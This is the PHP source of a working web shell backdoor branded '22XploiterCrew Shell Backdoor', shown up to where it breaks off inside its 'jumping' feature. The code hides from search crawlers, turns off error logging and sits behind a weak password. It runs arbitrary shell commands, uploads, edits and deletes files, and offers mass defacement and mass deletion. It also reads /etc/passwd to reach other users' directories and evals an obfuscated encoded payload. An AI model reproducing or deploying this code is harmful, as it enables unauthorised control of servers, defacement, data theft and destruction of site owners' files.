<?php
/*
[ Tak semua kami ngotak sendiri ]
Special thanks for Holiq@Indosec
Collabs team 22XploiterCrew ft Indosec Coder Team
*/
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$password 			= "21232f297a57a5a743894a0e4a801fc3";   // admin
$color 				= "#00ff00";
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}

function login_shell() {
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
		<meta name='author' content='CodeXploit|Mr.R4ND5@22XploiterCrew'/>
		<meta name='author' content='Holiq@Indosec'/>
		<meta name='copyright' content='22XploiterCrew'/>
		<meta name='description' content='Imutz Shell Backdoor'>
		<meta name="theme-color" content="#000">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">

    <title>22XploiterCrew Shell Backdoor</title>
    <style>
    	body{
    		background-color:black;
    		}
    	img{
    		width: 450px;
    		height: 250px;
    	}
    	input[type="password"]{
    		background-color: transparent;
    	}
    	h2{
    		font-family:"Rock Salt";
    	}
    </style>
  </head>
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">22XploiterCrew</h2><hr>
    	<img src="https://cdn.pixabay.com/photo/2012/05/07/02/49/pirate-47705_960_720.png" class="mx-auto d-block"><hr>
    		<form method="post">
    	<div class="row">
    		<div class="col">
    			<input type="password" name="pass" class="form-control">
    		</div>
    		<div class="col">
    			<input type="submit" class="btn btn-outline-light btn-block" value="Login">
    		</div>
    	</div></form>
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="https://22xploitercrew.com">22XploiterCrew</a></small>
    	</center>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
  </body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
?>
<?php
	function w($dir,$perm) {
		if(!is_writable($dir)) {
			return "<font color=red>".$perm."</font>";
		} else {
			return "<font color=lime>".$perm."</font>";
		}
	}
	function r($dir,$perm) {
		if(!is_readable($dir)) {
			return "<font color=red>".$perm."</font>";
		} else {
			return "<font color=lime>".$perm."</font>";
		}
	}

	function exe($cmd) {
		if(function_exists('system')) {
			@ob_start();
			@system($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('exec')) {
			@exec($cmd,$results);
			$buff = "";
			foreach($results as $result) {
				$buff .= $result;
			} return $buff;
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('shell_exec')) {
			$buff = @shell_exec($cmd);
			return $buff;
		}
	}
	
	function perms($file){
		$perms = fileperms($file);
	
		if (($perms & 0xC000) == 0xC000) {
			// Socket
			$info = 's';
		} elseif (($perms & 0xA000) == 0xA000) {
			// Symbolic Link
			$info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) {
			// Regular
			$info = '-';
		} elseif (($perms & 0x6000) == 0x6000) {
			// Block special
			$info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) {
			// Directory
			$info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) {
			// Character special
			$info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) {
			// FIFO pipe
			$info = 'p';
		} else {
			// Unknown
			$info = 'u';
		}
	
		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
		
		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}
	
	
	if(isset($_GET['path'])){
		$path = $_GET['path'];
		chdir($path);
	}else{
		$path = getcwd();
	}
	$path = str_replace('\\','/',$path);
	$paths = explode('/',$path);
	if(isset($_GET['dir'])) {
		$dir = $_GET['dir'];
		chdir($dir);
	} else {
		$dir = getcwd();
	}
	$kernel = php_uname(); eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
	$ip = getHostByName(getHostName());
	$ver = phpversion();
	$dom = $_SERVER['HTTP_HOST'];
	$dir = str_replace("\\","/",$dir);
	$scdir = explode("/", $dir);
	$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "On" : "Off";
	$ds = @ini_get("disable_functions");
	$mysql = (function_exists('mysql_connect')) ? "<font color=black>On</font>" : "<font color=red>Off</font>";
	$curl = (function_exists('curl_version')) ? "<font color=black>On</font>" : "<font color=red>Off</font>";
	$wget = (exe('wget --help')) ? "<font color=black>On</font>" : "<font color=red>Off</font>";
	$perl = (exe('perl --help')) ? "<font color=black>On</font>" : "<font color=red>Off</font>";
	$python = (exe('python --help')) ? "<font color=black>On</font>" : "<font color=red>Off</font>";
	$show_ds = (!empty($ds)) ? "$ds" : "NONE";
	$total = formatSize(disk_total_space($path));
	$free = formatSize(disk_free_space($path));
	$total1 = disk_total_space($path);
	$free1 = disk_free_space($path);
	$used = formatSize($total1 - $free1);
	function formatSize( $bytes ) {
		$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
		for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
		return( round( $bytes, 2 ) . " " . $types[$i] );
	}
	
	function ambilKata($param, $kata1, $kata2){
		if(strpos($param, $kata1) === FALSE) return FALSE;
		if(strpos($param, $kata2) === FALSE) return FALSE;
		$start = strpos($param, $kata1) + strlen($kata1);
		$end = strpos($param, $kata2, $start);
		$return = substr($param, $start, $end - $start);
		return $return;
	}
	
echo "
<html>
	<title>22XploiterCrew Shell Backdoor</title>
	<head>
		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
		<meta name='author' content='CodeXploit+Holiq'/>
		<meta name='copyright' content='22XploiterCrew'/>
		<meta name='description' content='Imutz Shell Backdoor'>
                <meta name='theme-color' content='#000'>
		<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css'>
		<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.2/css/all.css' >
		<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
		<script src='https://code.jquery.com/jquery-3.3.1.js'></script>
		<script src='https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js'></script>
		<link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>
	</head>
	<body class='text-light'>
		<script>
			$(document).ready(function(){
				$(window).scroll(function(){
					if ($(this).scrollTop() > 700) {
						$('.scrollToTop').fadeIn();
					}else{
						$('.scrollToTop').fadeOut();
					}
				});
				$('.scrollToTop').click(function(){
					$('html, body').animate({scrollTop : 0},1000);
					return false;
				});
			});
		</script>
		<style>
		body{background-color:black;}
			@import url(https://fonts.googleapis.com/css?family=Lato);
			body{margin:0;padding:0;font-family:'Lato';}
			#tab table thead th{padding:5px;font-size:16px;}
			#tab tr {border-bottom:1px solid #fff;}
			#tab tr:hover{background:#5B6F7D; color:#fff;}
			#tab tr td{padding:5px;}
			#tab tr td .badge{font-size:13px;}
			a {font-family:'Quicksand';color:white;}
			a:hover{color:dodgerBlue;}
			.ico {width:20px;}
			.ico2{width:20px;}
			.scrollToTop{
				position:fixed;
				bottom:30px;
				right:30px;
				width:35px;
				height:35px;
				background:#262626;
				color:#fff;
				border-radius:15%;
				text-align:center;
				opacity:.5;
			}
			.scrollToTop:hover{color:#fff;}
			.up{font-size:20px;line-height:35px;}
			.lain{color:#888888;font-size:20px;margin-left:5px;top:1px;}
			.lain:hover{color:#fff;}
			.tambah{
				width:35px;
				height:35px;
				line-height:35px;
				border:1px solid;
				border-radius:50%;
				text-align:center;
			}
			.fiture{margin:2px;}
			.tmp{background:#F4F4F4;color:rgb(153,153,153);}
			.tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;}
			.about{color:#000;}
			.about .card-body .img{
				position: relative;
				background: url(https://i.postimg.cc/Wb1X4xNS/image.png);
				background-size: cover;
				width: 150px;
				height: 150px;
			}
			.butn {
				position: relative;
				text-align: center;
				padding: 3px;
				background:rgba(225,225,225,.3);
				-webkit-transition: background 300ms ease, color 300ms ease;
				transition: background 300ms ease, color 300ms ease;
			}
			input[type='radio'].toggle {
				display: none;
			}
			input[type='radio'].toggle + label {
				cursor: pointer;
				margin: 0 2px;
				width: 60px;
			}
			input[type='radio'].toggle + label:after {
				position: absolute;
				content: '';
				top: 0;
				background: #fff;
				height: 100%;
				width: 100%;
				z-index: -1;
				-webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
				transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
			}
			input[type='radio'].toggle.toggle-left + label:after {
				left: 100%;
			}
			input[type='radio'].toggle.toggle-right + label {
				margin-left: -5px;
			}
			input[type='radio'].toggle.toggle-right + label:after {
				left: -100%;
			}
			input[type='radio'].toggle:checked + label {
				cursor: default;
				color: #000;
				-webkit-transition: color 400ms;
				transition: color 400ms;
			}
			input[type='radio'].toggle:checked + label:after {
				left: 0;
			}
		</style>
		<nav class='navbar static-top navbar-dark'>
			<button class='navbar-toggler'type='button' data-toggle='collapse' data-target='#info'>
				<i style='color:#fff;' class='fa fa-user'></i>
			</button>
			<div class='collapse navbar-collapse' id='info'>
				<div class='table-responsive-lg'>
				<ul>
					<a href='?' class='fiture btn btn-primary btn-sm btn-block mb-2'><i class='fa fa-home'></i> Home</a>
					<div class='row'>
	<div class='col'>
		<a href='?dir=$dir&aksi=upload' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-upload'></i> Upload</a>
	</div>
	<div class='col'>
		<a href='?dir=$dir&aksi=buat_file' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-plus-circle'></i> Buat File</a>
	</div>
	<div class='col'>
		<a href='?dir=$dir&aksi=buat_folder' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-plus'></i> Buat Folder</a>
	</div>
</div>
<div class='row'>
	<div class='col'>
		<a href='?dir=$dir&aksi=MassDeface' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-exclamation-triangle'></i> Mass Deface</a>
	</div>
	<div class='col'>
		<a href='?dir=$dir&aksi=MassDellete' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-trash'></i> Mass Delete</a>
	</div>
	<div class='col'>
		<a href='?dir=$dir&aksi=jumping' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-exclamation-triangle'></i> Jumping</a>
	</div>
</div>
<div class='row'>
	<div class='col'>
		<a href='?dir=$dir&aksi=config' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-cogs'></i> Config</a>
	</div>
	<div class='col'>
		<a href='?dir=$dir&aksi=adminer' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-user'></i> Adminer</a>
	</div>
	<div class='col'>
		<a href='?dir=$dir&aksi=symlink' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-exclamation-circle'></i> Symlink</a>
	</div>
</div>
<div class='row'>
	<div class='col'>
		<a href='?dir=$dir&aksi=CpanelReset' class='fiture btn btn-danger btn-sm btn-block'><i class='fa fa-key'></i> Auto Reset Cpanel</a>
	</div>
	<div class='col'>
		<a href='?keluar' class='fiture btn btn-warning btn-sm btn-block'><i class='fa fa-sign-out'></i> keluar</a>
	</div>
</div>
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
				</ul>
				</div>
			</div>
		</nav>
		<div class=''>
			<h1 class='text-center'><a href='https://www.22xploitercrew.com'>[ ! ] 22XploiterCrew [ ! ]</h1>
			<center><p>Keep Fighting, Even Though It's All Impossible</a></p></center>
			<hr/>";
		//keluar
		if (isset($_GET['keluar'])) {
			session_start();
			session_destroy();
			echo '<script>window.location="?";</script>';
		}
		
		// Info Server
		if($_GET['aksi'] == 'InfoServer'){
			echo '
	<div class="alert alert-info mt-3">
		<h3 class="text-center">Informasi Server</h3><hr>
		<li>Nama Server : '.$_SERVER["SERVER_NAME"].'</li>
		<li>Ip Address : '.$_SERVER["SERVER_ADDR"].'</li>
		<li>Port : '.$_SERVER["SERVER_PORT"].'</li>
		<li>HDD : '.$used.' / '.$total.'</font> ( Free: '.$free.' )</li>
		<li>Protokol : '.$_SERVER["SERVER_PROTOCOL"].'</li>
		<li>Save Data : '.$_SERVER["HTTP_SAVE_DATA"].'</li>
		<li>Save Mode : '.$sm.'</li>
		<li>Fungsi Nonaktif : '.$show_ds.'</li>
		<li>Koneksi : '.$_SERVER["HTTP_CONNECTION"].'</li>
		<li>Software : '.$_SERVER["SERVER_SOFTWARE"].'</li>
		<li>Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].'</li>
		<li>G-Interface : '.$_SERVER["GATEWAY_INTERFACE"].'</li>
		<li>R-Method : '.$_SERVER["REQUEST_METHOD"].'</li>
		<li>Mysql : '.$mysql.'</li>
		<li>Perl : '.$perl.'</li>
		<li>Wget : '.$wget.'</li>
		<li>Curl : '.$curl.'</li>
		<li>Sistem Server : '.$kernel.'</li>
		<hr>
		<li>Your IP: '.$_SERVER["REMOTE_ADDR"].'</li>
		<li>Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</li>
		</div>';
		}
		
		//upload
		if ($_GET['aksi'] == 'upload') {
			echo 
				"<form method='post' enctype='multipart/form-data' name='uploader' id='uploader'>
					<div class='form-group'>
						<label>Upload File: </label><br>
						<input class='' type='file' name='file'>
					</div>
					<div class='form-group'>
						<input class='btn btn-primary btn-sm' type='submit' value='Upload'>
					</div>
				</form>";
		
			if(isset($_FILES['file'])){
				if(@copy($_FILES['file']['tmp_name'],$dir.'/'.$_FILES['file']['name'])){
					echo '<script>window.location="?dir='.$dir.'"; alert("Upload Berhasil");</script>';
				}else{
					echo '<script>alert("Gagal Upload!!!");</script>';
				}
			}
		}

		//openfile
		if (isset($_GET['dirf'])) {
			$file = $_GET['dirf'];
		}
			
		//buat_file
		if ($_GET['aksi'] == 'buat_file') {
			
			$output = "
			<form method='post'>
				<input type='text' class='form-control mb-3' name='nama_file' placeholder='Nama File'>
				<textarea name='isi_file' class='form-control mb-3' rows='8' placeholder='Isi File'></textarea>
				<button type='sumbit' class='btn btn-outline-primary btn-block' name='bikin'>Buat</button><br/>
			</form>";
			echo $output;
		
			if (isset($_POST['bikin'])) {
				$nama_file 	= $_POST['nama_file'];
				$isi_file 	= $_POST['isi_file'];
				$handle 	= fopen("$nama_file", "w");

				if (fwrite($handle, $isi_file)) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Buat File Berhasil");</script>';
				}else{ 
					echo '<script>("File Gagal Dibuat");</script>';
				}
			}
		}
		
		/*
			View
		*/
		if($_GET['aksi'] == 'view') {
			echo '<center>[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">Lihat</a> ]  
			[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  
			[ <a href="?dir='.$path.'&aksi=hapusf&dirf='.$file.'">Delete</a> ]</center>';
			echo "
			<textarea rows='16' class='form-control mt-3' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>
			<br/><br/>";
		}
		
		/*
			Edit
		*/
		if($_GET['aksi'] == 'edit') {
			$nama = basename($file);
			echo '<center>[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&dirf='.$file.'">Ubah Nama</a> ]  
			[ <a href="?dir='.$path.'&aksi=hapusf&dirf='.$file.'">Delete</a> ]</center><hr>';
			echo "<form method='post' class='mt-3'>
				<p class='ml-2'><i class='fa fa-file'></i> $nama</p>
				<textarea rows='16' class='form-control mb-3' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea>
					<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Ubah</button>
			</form><br/>";
			
			if(isset($_POST['edit_file'])) {
				$updt = fopen("$file", "w");
				$hasil = fwrite($updt, $_POST['isi']);
				
				if ($hasil) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Mengubah Isi File");</script>';
				}else{
					echo '<script>alert("Gagal Mengubah Isi File");</script>';
				}
			}
		}
		
		/*
			Ubah Nama
		*/
		if($_GET['aksi'] == 'rename') {
			$nama = basename($file);
			echo '<center>[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Kembali</a> ]</center>';
			echo "<form method='post' class='mt-3'>
				<p class='ml-2'><i class='fa fa-file'></i> $nama</p>
				<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Update</button><br/>
			</form><br/>";
		
			if(isset($_POST['rename_file'])) {
				$lama = $file;
				$baru = $_POST['namanew'];
				rename( $baru, $lama);
				if(file_exists($baru)) {
					echo '<script>alert("Nama '.$baru.' Telah Digunakan");</script>';
				}else{
					if(rename( $lama, $baru)) {
						echo '<script>window.location="?dir='.$dir.'"; alert("Sukses Mengganti Nama Menjadi '.$baru.'");</script>';
					}else{
						echo '<script>alert("Gagal Mengganti Nama");</script>';
					}
				}
			}
		}
		
		/*
			Delete File
		*/
		if ($_GET['aksi'] == 'hapusf') {
			$nama = basename($file);
			echo '<center>
			[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">Lihat</a> ]  
			[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  
			[ <a href="?dir='.$dir.'&aksi=rename&dirf='.$file.'">Ubah Nama</a> ]</center>';
			$output ="
			<div class=''>
				<center><br/>
					<font color='white'>Yakin Ingin Menghapus File : $nama
				</center><br/><br/>
				<form method='post'>
				<div class='row'>
				<div class='col'>
				<input type='submit' name='ya' class='float-right btn btn-success btn-success btn-block' value='Ya'>
					</div>
					<div class='col'>
					<a class='btn btn-danger btn-block' href='?dir=$dir'>Tidak</a>
					</div>
					</div>
				</form>
			</div><br/>";
			echo $output;
			
			if ($_POST['ya']) {
				$hapus = unlink($file);
				if ($hapus) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Menghapus File");</script>';
				}else{
					echo '<script>alert("Gagal Menghapus File!");</script>';
				}
			}
		}
		
		/*
			Add Folder
		*/
		if ($_GET['aksi'] == 'buat_folder' ) {
			$output = "
			<form method='post'>
				<input type='text' class='form-control mb-4' name='nama_folder' placeholder='Nama Folder'>
				<button type='sumbit' class='btn btn-outline-primary btn-block' name='buat'>Buat</button><br/>
			</form>";
			echo $output;
		
			if (isset($_POST['buat'])) {
				$nama_folder = $_POST['nama_folder'];
				$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $_POST["nama_folder"]);
				$fd = mkdir ($folder);
				if ($fd) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Membuat Folder");</script>';
				}else{
					echo "echo '<script> alert('Folder ".$folder." Gagal Dibuat');</script>";
				}
			}
		}
		
		/*
			Delete Folder
		*/
		if ($_GET['aksi'] == 'hapus_folder' ) {
			$nama = basename(getcwd());
			$output ="
			<center>[ <a href='?dir=".$dir."&aksi=rename_folder'>Ubah Nama</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ]</center> 
			<div class='container'>
				<center><br/>
					<font color='white'>Yakin Ingin Menghapus Folder : $nama ?
				</center><br/><br/>
				<form method='post'>
				<div class='row'>
				<div class='col'>
					<input type='submit' name='ya' class='float-right btn btn-success btn-block' value='Iya'>
					</div>
					<div class='col'>
					<a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
					</div>
					</div>
				</form>
			</div><br/>";
			echo $output;
			
			if ($_POST['ya']) {
				if(is_dir($dir)) {
					if(is_writable($dir)) {
						@rmdir($dir);
						@exe("rm -rf $dir");
						@exe("rmdir /s /q $dir");
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Menghapus Folder');</script>";
					} else {
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Tidak Dapat Menghapus Folder');</script>";
					}
				}
			}
		exit;
		}
		
		/*
			Ubah Nama Folder
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			$nama = basename(getcwd());
			$output="
			<center> 
			[ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ]<hr></center><p class='ml-2'>Nama Folder => $nama</p>
			<form method='post'>
				<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button><br/>
			</form>";
			echo $output;
			
			if (isset($_POST['ganti'])) {
				$lama = $dir;
				$baru = $_POST['namanew'];
				$ubah = rename($lama, $baru);
				if($ubah) {
					echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Mengganti Nama');</script>";
				}else{
					echo "<script>alert('Gagal Mengganti Nama');</script>" ;
				}
			}
			exit;
		}

		/*
			mass delete
		*/
		if($_GET['aksi'] == 'MassDellete') {
			
			function hapus_massal($dir,$namafile) {
				if(is_writable($dir)) {
					$dira = scandir($dir);
					foreach($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc.'/'.$namafile;
						if($dirb === '.') {
							if(file_exists("$dir/$namafile")) {
								unlink("$dir/$namafile");
							}
						} elseif($dirb === '..') {
							if(file_exists("".dirname($dir)."/$namafile")) {
								unlink("".dirname($dir)."/$namafile");
							}
						} else {
							if(is_dir($dirc)) {
								if(is_writable($dirc)) {
									if($lokasi) {
											echo "$lokasi > Terhapus\n";
										unlink($lokasi);
										$massdel = hapus_massal($dirc,$namafile);
									}
								}
							}
						}
					}
				}
			}

			if($_POST['start']) {
				echo "<textarea class='form-control' rows='8' disabled='disabled'>";
					hapus_massal($_POST['d_dir'], $_POST['d_file']);
				echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
			} else {
				echo "<form method='post'>
					<p><i class='fa fa-folder'></i> Lokasi</p>
					<input type='text' name='d_dir' value='$dir' class='form-control'><br>
					<p><i class ='fa fa-file'></i> Nama File</p>
					<input type='text' name='d_file' placeholder='index.php' class='form-control'><br>
					<input type='submit' name='start' value='Hapus' class='btn btn-danger form-control'>
			</form>";
			}
			exit;
		}



	/*
		Mass Deface
	*/
	if($_GET['aksi'] == 'MassDeface') {
		
		function tipe_massal($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$lokasi = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($lokasi, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($lokasi, $isi_script);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "Berhasil => $lokasi\n";
								file_put_contents($lokasi, $isi_script);
								$MassDeface = tipe_massal($dirc,$namafile,$isi_script);
							}
						}
					}
				}
			}
		}
		
		function tipe_biasa($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$lokasi = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($lokasi, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($lokasi, $isi_script);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "Berhasil => $dirb/$namafile\n";
								file_put_contents($lokasi, $isi_script);
							}
						}
					}
				}
			}
		}
		
		if($_POST['start']) {
			
			echo "<textarea class='form-control' rows='8' disabled='disabled'>";
			if($_POST['tipe'] == 'mahal') {
				tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			} elseif($_POST['tipe'] == 'murah') {
				tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			}
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
		} else {
			echo "<form method='post'>
				<center>
					<p>{ Type Mass Deface }</p>
					<input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
					<label for='toggle-on' class='butn'>Biasa</label>
					<input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
					<label for='toggle-off' class='butn'>Masal</label>
				</center><hr>
				<p><i class='fa fa-folder'></i> Lokasi</p>
				<input type='text' name='d_dir' value='$dir' class='form-control'><br>
				<p><i class ='fa fa-file'></i> Nama File</p>
				<input type='text' name='d_file' placeholder='index.php' class='form-control'><br/>
				<p><i class ='fa fa-file'></i> Isi File</p>
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By 22XploiterCrew'></textarea><br/>
				<input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
			</form>";
		}
		exit;
	}



	/* 
		Jumping
	*/
	if($_GET['aksi'] == 'jumping') {
		$i = 0;
		echo "<div class='card container'>";
		if(preg_match("/hsphere/", $dir)) {
			$urls = explode("\r\n", $_POST['url']);
			if(isset($_POST['jump'])) {
				echo "<pre>";
				foreach($urls as $url) {
					$url = str_replace(array("http://","www."), "", strtolower($url));
					$etc = "/etc/passwd";
					$f = fopen($etc,"r");
					while($gets = fgets($f)) {
						$pecah = explode(":", $gets);
						$user = $pecah[0];
						$dir_user = "/hsphere/local/home/$user";
						if(is_dir($dir_user) === true) {
							$url_user = $dir_user."/".$url;
							if(is_readable($url_user)) {
								$i++;
								$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
								if(is_writable($url_user)) {
									$jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
								}
								echo $jrw."<br>";
							}
						}
					}
				}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." di ".$ip;
			}
			echo "</pre>";
			} else {
				echo '<center>
					  <form method="post">
					  List Domains: <br>
					  <textarea name="url" class="form-control">';
				$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)) {
					echo $getss;
				}
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
					  </form></center>';
			}
